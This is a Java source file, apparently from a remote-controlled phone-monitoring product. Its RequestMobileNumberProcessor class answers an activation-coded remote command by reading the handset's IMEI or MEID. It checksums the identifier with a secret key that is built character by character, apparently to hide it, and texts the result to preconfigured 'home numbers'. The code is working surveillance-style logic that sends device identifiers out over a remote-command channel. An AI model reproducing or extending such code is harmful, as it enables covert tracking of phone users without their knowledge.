package com.vvt.remotecommandmanager.processor.activationandinstallation;

import com.vvt.appcontext.AppContext;
import com.vvt.crc.CRC32Checksum;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.phoneinfo.PhoneInfo;
import com.vvt.phoneinfo.PhoneType;
import com.vvt.preference_manager.PrefHomeNumber;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;
import com.vvt.sms.SmsUtil;

public class RequestMobileNumberProcessor extends RemoteCommandProcessor {
	private static final String TAG = "RequestMobileNumberProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private PreferenceManager mPreferenceManager;
	private FxEventRepository mFxEventRepository;
	private PhoneInfo mPhoneInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public RequestMobileNumberProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager, PhoneInfo phoneInfo) {
		
		super(appContext,eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
		mFxEventRepository = eventRepository;
		mPhoneInfo = phoneInfo;
	}
	
	@Override
	public ProcessingType getProcessingType() {
		 return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		try {
			
			if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
				mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
			} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
				mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
			}
			
			PrefHomeNumber  homePreference = (PrefHomeNumber)mPreferenceManager.getPreference(PreferenceType.HOME_NUMBER);
			
			if(homePreference.getHomeNumber().size() == 0) {
				FxSystemEvent systemEvent = new FxSystemEvent();
				systemEvent.setDirection(FxEventDirection.OUT);
				systemEvent.setEventTime(System.currentTimeMillis());
				systemEvent.setLogType(FxSystemEventCategories.CATEGORY_PHONE_NUMBER_UPDATE_HOME_IN);
				systemEvent.setMessage(MessageManager.REQUEST_MOBILE_NUMBER_ERROR_HOME_NOT_SET);
				mFxEventRepository.insert(systemEvent);

				mReplyMessageBuilder.append(MessageManager.REQUEST_MOBILE_NUMBER_ERROR_HOME_NOT_SET);
				mReplyMessage.setIsSuccess(false);
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			}
			else {
				
				String message = "";
				String deviceId = null;

				if (mPhoneInfo.getPhoneType() == PhoneType.PHONE_TYPE_CDMA) {
					deviceId = mPhoneInfo.getMEID();
				} else if (mPhoneInfo.getPhoneType() == PhoneType.PHONE_TYPE_GSM) {
					deviceId = mPhoneInfo.getIMEI();
				} else {
					deviceId = mPhoneInfo.getMEID();
					if (deviceId == null) {
						deviceId = mPhoneInfo.getIMEI();
					}
				}			
			       
			    String checkSum = getChecksum(mLicenseInfo.getActivationCode(), deviceId, "3");
			    
			    //<2><IMEI><CHECKSUM>
		        StringBuilder sb = new StringBuilder();
		        sb.append("<2>");
		        sb.append(String.format("<%s>", deviceId));
		        sb.append(String.format("<%s>", checkSum));
		        message = sb.toString(); 
		        
		        FxSystemEvent systemEvent = new FxSystemEvent();
				systemEvent.setDirection(FxEventDirection.OUT);
				systemEvent.setEventTime(System.currentTimeMillis());
				systemEvent.setLogType(FxSystemEventCategories.CATEGORY_PHONE_NUMBER_UPDATE_HOME_IN);
				systemEvent.setMessage(message);
				mFxEventRepository.insert(systemEvent);
				
				for(String hn: homePreference.getHomeNumber()) {
					SmsUtil.sendSms(hn, message);
					if(LOGV) FxLog.v(TAG, String.format("doProcessCommand # Sending SMS \"%s\" to %s ...", message, hn));
				}
				
				mReplyMessageBuilder.append(MessageManager.REQUEST_MOBILE_NUMBER_SUCCESS);
				mReplyMessage.setIsSuccess(true);
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());	
			}
			
		}
		catch(Throwable t) {
			FxLog.e(TAG, t.toString());
			
			mReplyMessageBuilder.append(MessageManager.REQUEST_MOBILE_NUMBER_ERROR);
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT...");
	}
 
	private String getChecksum(String activationCode, String deviceId, String cmd) {
		String tail = new StringBuilder().append('P').append('X').append('2')
				.append('U').append('I').append('Z').append('V').append('P')
				.append('N').append('O').toString();
		String strCrc32 = null;

		try {
			String data = cmd + deviceId + activationCode + tail;
			long crc32 = CRC32Checksum.calculate(data.getBytes("UTF-8"));
			strCrc32 = Integer.toHexString((int) crc32).toUpperCase();

		} catch (Exception e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}

		return strCrc32;
	}

	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException {
		// Netwrok command only!
		RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);		
	}
	
	
	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

	
}
